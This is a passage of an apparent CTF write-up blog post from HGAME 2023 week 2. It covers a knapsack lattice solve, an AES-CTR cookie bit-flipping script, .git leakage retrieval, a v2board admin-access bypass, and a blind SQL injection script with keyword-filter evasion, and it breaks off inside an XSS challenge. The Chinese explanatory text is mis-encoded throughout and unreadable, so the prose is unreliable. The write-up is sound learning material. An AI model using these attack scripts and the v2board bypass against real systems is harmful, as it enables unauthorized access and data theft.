class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br></pre></td></tr></table></figure></blockquote><p>å…ˆåˆ©ç”¨ $b_0$ æ±‚ $w$ï¼Œå†è§£èƒŒåŒ…å¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line">w = b0//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢„ä¼°é•¿åº¦</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    l = m.nbits() - k</span><br><span class="line">    a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    </span><br><span class="line">    pk =  b</span><br><span class="line">    ct =  c</span><br><span class="line">    n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line">    M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">    M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">    last_col = pk</span><br><span class="line">    last_col.append(ct)</span><br><span class="line">    M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">    M = M.stack(M_last_row)</span><br><span class="line">    M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">    X = M.BKZ()</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">                <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,sol)),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;:/b2\x83.F\x832z2\x1a\x82v&#123;\x1a\x82Z2G&quot;\x82Z/\x03&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;b\xe8N\xe6\xbeh\xdc\xbef\xc2\xe6\xf2\xbe\xc4\xc2r\xbe\xd2\xe6\xdcn\xbe\xd2\xe8~&#x27;</span></span><br><span class="line"><span class="comment"># b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="é›¶å…ƒè´­å¹´è´§å•†åº—"><a href="#é›¶å…ƒè´­å¹´è´§å•†åº—" class="headerlink" title="é›¶å…ƒè´­å¹´è´§å•†åº—"></a>é›¶å…ƒè´­å¹´è´§å•†åº—</h3><blockquote><p>å¬è¯´å…”å…”è¦ä¹°å¹´è´§ï¼Œæ­£å¥½æç“¦ç‰¹å¤§é™†çš„ç’ƒæœˆæµ·ç¯èŠ‚ä¹Ÿè¦åˆ°äº†ï¼Œtr0ubleç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡äº†ä¸€ä»½flagå¤§ç¤¼ã€‚å—¯ï¼Œä½ ä¹Ÿæƒ³è¦ï¼Ÿä¸å¯ä»¥å“¦ã€‚</p></blockquote><p><code>router/router.go</code> é‡Œä¸»è¦é€»è¾‘ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	_, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	userName := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> userName == <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">		c.String(http.StatusForbidden, <span class="string">&quot;å…”å…”æ‰ä¸å¯èƒ½æ˜¯ä½ å‘¢ï¼ï¼&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: <span class="string">&quot;230555433&quot;</span>&#125;</span><br><span class="line">	jsonUser, _ := json.Marshal(User)</span><br><span class="line">	token, _ := util.Encrypt(<span class="keyword">string</span>(jsonUser))</span><br><span class="line">	c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">	c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buyController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	method := c.Request.Method</span><br><span class="line">	token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusForbidden, <span class="string">&quot;æ²¡æœ‰èº«ä»½çš„äººå¯ä¸èƒ½æ¥è¿™å„¿ä¹°ä¸œè¥¿ã€‚&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	jsonUser, err := util.Decrypt(token)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	User := user.User&#123;&#125;</span><br><span class="line">	err = json.Unmarshal([]<span class="keyword">byte</span>(jsonUser), &amp;User)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	name := User.Name</span><br><span class="line">	<span class="keyword">if</span> method != http.MethodGet &#123;</span><br><span class="line">		c.String(http.StatusMethodNotAllowed, fmt.Sprintf(<span class="string">&quot;your method: %s. but only get method allowed&quot;</span>, method))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		product := c.Query(<span class="string">&quot;prod&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> product == <span class="string">&quot;flag&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> name != <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">				c.String(http.StatusOK, <span class="string">&quot;flag å¯æ˜¯ç‰¹åœ°ä¸ºå…”å…”å‡†å¤‡çš„ï¼&quot;</span>)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				file, _ := os.Open(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">				flag, _ := io.ReadAll(file)</span><br><span class="line">				c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully\n%s&quot;</span>, name, product, flag))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully&quot;</span>, name, product))</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦tokené‡ŒuserNameå€¼ä¸º <code>Vidar-Tu</code>ï¼Œä½†ä¸èƒ½ç›´æ¥è¾“å…¥ <code>Vidar-Tu</code>ã€‚</p><p>æŸ¥çœ‹ <code>util/util.go</code> é‡Œï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">var</span> iv = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	_, _ = rand.Read(key)</span><br><span class="line">	_, _ = rand.Read(iv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(u <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	plainText := []<span class="keyword">byte</span>(u)</span><br><span class="line">	blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">	cipherText := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(plainText))</span><br><span class="line">	blockMode.XORKeyStream(cipherText, plainText)</span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(cipherText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(cipherText <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">	decodeData, err := base64.StdEncoding.DecodeString(cipherText)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;invalid base64&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">	plainText := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(decodeData))</span><br><span class="line">	blockMode.XORKeyStream(plainText, decodeData)</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(plainText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tokençš„ä½¿ç”¨AES-CTRæ¨¡å¼åŠ å¯†ç”Ÿæˆï¼Œè€Œåœ¨CTRæ¨¡å¼ä¸­ï¼Œ æœ‰ä¸€ä¸ªè‡ªå¢çš„ç®—å­ï¼ˆIVï¼Œåå››ä¸ªå­—èŠ‚ç›¸å½“äºè®¡æ•°å™¨ï¼Œæ¯æ¬¡è®¡ç®—é€’å¢ï¼‰ï¼Œè¿™ä¸ªç®—å­ç”¨å¯†é’¥åŠ å¯†ä¹‹åçš„è¾“å‡ºå’Œæ˜æ–‡å¼‚æˆ–çš„ç»“æœå¾—åˆ°å¯†æ–‡ï¼Œç›¸å½“äºä¸€æ¬¡ä¸€å¯†ï¼Œå³ $m \oplus \text{keystream} = c$ã€‚</p><p>ç”¨æˆ·åå’Œtokenä¸ºä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œè¾“å…¥ <code>Vidar-Tv</code> å’Œ <code>Vidar-Tw</code> è·å–å¯¹åº”tokençš„base64å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æ”¹å˜çš„å­—ç¬¦ï¼Œçˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    token = <span class="string">f&#x27;NnL3arZc7tt+ezcky+B8fF<span class="subst">&#123;k&#125;</span>75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27;</span></span><br><span class="line">    r = s.get(url, cookies=&#123;<span class="string">&#x27;token&#x27;</span>:quote(token)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Vidar-Tu&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(k,quote(token),r.text)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 6 NnL3arZc7tt%2Bezcky%2BB8fF675UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt%2BA%3D%3D Vidar-Tu buy firecracker successfully</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹cookieä¸­çš„tokenï¼Œè´­ä¹°flagï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;5o_Eas9_6yte_flip_@t7ack_wi4h_4ES-CTR&#125;</code>ã€‚</p><p>â€‹</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Git-Leakage"><a href="#Git-Leakage" class="headerlink" title="Git Leakage"></a>Git Leakage</h3><blockquote><p>ç”µè§†å‰§é‡Œçš„é»‘å®¢?çœŸæ­£çš„é»‘å®¢ï¼</p></blockquote><p>é¢˜ç›®å³æç¤ºï¼Œgitæ³„éœ²ã€‚</p><p>è®¿é—® <code>http://HOST:PORT/.git/</code>ï¼Œä½¿ç”¨wgetä¸‹è½½gitç›®å½•ï¼š</p><p><code>wget -r http://week-2.hgame.lwsec.cn:31765/.git/</code></p><p>è¿›å…¥ <code>.git/logs</code>ï¼Œä½¿ç”¨ <code>git reflog</code> æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œè®°å½•ï¼ˆåŒ…æ‹¬å·²ç»è¢«åˆ é™¤çš„ commit è®°å½•å’Œ reset çš„æ“ä½œï¼‰ï¼›</p><p>é€‰æ‹©éœ€è¦æŸ¥çœ‹çš„è®°å½•ï¼Œ<code>git show 1dd69e2</code> æ‹¿åˆ°flagï¼š<code>hgame&#123;Don&#39;t^put*Git-in_web_directory&#125;</code>ã€‚</p><p>â€‹</p><h3 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h3><blockquote><p>è¯·å°è¯•è·å–Adminç”¨æˆ·çš„è®¢é˜…é“¾æ¥ï¼Œflagæ ¼å¼ä¸ºhgame{adminç”¨æˆ·è®¢é˜…é“¾æ¥ä¸­çš„tokenå€¼}ã€‚</p></blockquote><p>v2boardå­˜åœ¨è¶Šæƒæ¼æ´ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.ctfiot.com/88960.html">v2boardè¶Šæƒæ¼æ´å¤ç°</a>ã€‚</p><p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·ï¼Œç„¶åé€šè¿‡ <code>http://HOST:PORT/api/v1/passport/auth/login</code> æ¥å£ç™»å½•è¯¥è´¦å·ï¼Œä¼šè¿”å›ä¸€ä¸ª <code>auth_data</code> å€¼ï¼›</p><p>ç„¶åè®¿é—® <code>http://HOST:PORT/api/v1/user/login</code> æ¥å£ï¼Œå¹¶å°†ä¸Šè¿°è·å¾—çš„ <code>auth_data</code> ä½œä¸ºauthorizationå¤´å‘é€ï¼Œè®©æœåŠ¡å™¨å°†æ™®é€šç”¨æˆ·çš„Authorizationå¤´å†™å…¥ç¼“å­˜ä¸­ï¼›</p><p>æœ€ååªè¦å¸¦ä¸Šè¿™ä¸ªAuthorizationå¤´å³å¯è®¿é—®æ‰€æœ‰çš„ç®¡ç†å‘˜æ¥å£ã€‚</p><p>è®¿é—® <code>http://HOST:PORT/api/v1/admin/user/fetch?pageSize=10&amp;current=1</code>ï¼Œå¾—åˆ°flagï¼š<code>hgame&#123;39d580e71705f6abac9a414def74c466&#125;</code>ã€‚</p><p>â€‹</p><h3 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h3><blockquote><p>R1esbyfeç»™å…”å…”å†™äº†ä¸€ä¸ªç®€æ˜“çš„æŸ¥è¯¢é¢æ¿ï¼Œåªéœ€è¦è¾“å…¥idæ•°å­—ï¼Œå°±å¯ä»¥æŸ¥åˆ°å…”å…”æœ€è¿‘ä¹°çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬å¹´è´§ï¼‰</p><p>R1esbyfe:â€é¢æ¿ç™»é™†ç”¨æˆ·åæ˜¯user01,å¯†ç â€¦â€¦å¿˜äº†ï¼Œåæ­£æ˜¯ä¸ªæ¯”è¾ƒå¥½çŒœçš„å¯†ç â€</p><p>è²Œä¼¼R1esbyfeè¿˜è—äº†ç‚¹æƒŠå–œï¼Œä½ èƒ½å¸®åŠ©å…”å…”æ‰¾åˆ°å®ƒå—ï¼Ÿ</p><p>(æ•°æ®åº“å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œè‹¥å‡ºç°Internal Errorï¼Œéœ€è¦ç¨ç­‰ç‰‡åˆ»)</p><p>HINTS:</p><p>å¯†ç æ˜¯å¼±å¯†ç ï¼Œå¯ä»¥è‡ªå·±æ‰¾ä¸ªdictçˆ†ç ´ä¸€ä¸‹</p></blockquote><p>æ ¹æ®hintçŒœå¯†ç  <code>admin123</code>ï¼Œsqlæ³¨å…¥ï¼Œfuzzå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ã€selectã€databaseã€orã€ç­‰å·ã€å¤§å°äºå·ç­‰å…³é”®å­—ã€‚å…³é”®å­—æ”¹å¤§å†™ï¼Œç­‰å·æ”¹ <code>regexp</code> ç»•è¿‡ã€‚</p><p>å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.digits+string.ascii_letters+<span class="string">&#x27;&#123;&#125;-_?!,&#x27;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30685/search&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(DATABASE())&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(table_name))FROM(infOrmation_schema.tables)WHERE((table_schema)regexp(&quot;se4rch&quot;))&#x27;</span></span><br><span class="line">        <span class="comment">#sql = &#x27;SELECT(group_concat(column_name))FROM(infOrmation_schema.columns)WHERE((table_name)regexp(&quot;5ecret15here&quot;))&#x27;</span></span><br><span class="line">        sql = <span class="string">&#x27;SELECT(hex(f14gggg1shere))FROM(se4rch.5ecret15here)&#x27;</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;))&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;search_id&#x27;</span>:payload&#125;</span><br><span class="line">        cookie = &#123;<span class="string">&#x27;SESSION&#x27;</span>:<span class="string">&#x27;MTY3MzYyOTg3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT18Znqyk--boNReiPrlLxxyJ0FrSzzwttTHP8L2NJy6KFg=&#x27;</span>&#125;</span><br><span class="line">        r = s.post(url,data=data,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            now += j</span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># database: se4rch</span></span><br><span class="line"><span class="comment"># table: 5ecret15here,L1st,user1nf0</span></span><br><span class="line"><span class="comment"># column: f14gggg1shere</span></span><br><span class="line"><span class="comment"># 6867616d657b345f4d346e5f5748305f4b6e3077735f5765346b2d50347373573072645f416e645f53514c217d</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>hgame&#123;4_M4n_WH0_Kn0ws_We4k-P4ssW0rd_And_SQL!&#125;</code>ã€‚</p><p>â€‹</p><h3 id="Designer"><a href="#Designer" class="headerlink" title="Designer"></a>Designer</h3><blockquote><p>Come and design your button</p></blockquote><p>åœ¨ <code>index.js</code> ä¸­ <code>/button/share</code> è·¯ç”±ä¼šè°ƒç”¨ <code>/button/preview</code> è·¯ç”±ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/button/share&quot;</span>, auth, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/chromium&quot;</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">  <span class="keyword">const</span> query = querystring.encode(req.body)</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://127.0.0.1:9090/button/preview?&#x27;</span> + query)</span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">localStorage</span>.setItem(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;jwt_token_here&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">await</span> page.click(<span class="string">&quot;#button&quot;</span>)</span><br><span class="line"></span><br><span class="line">  res.json(&#123; <span class="attr">msg</span>: <span class="string">&quot;admin will see it later&quot;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/button/preview&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> blacklist = [</span><br><span class="line">    <span 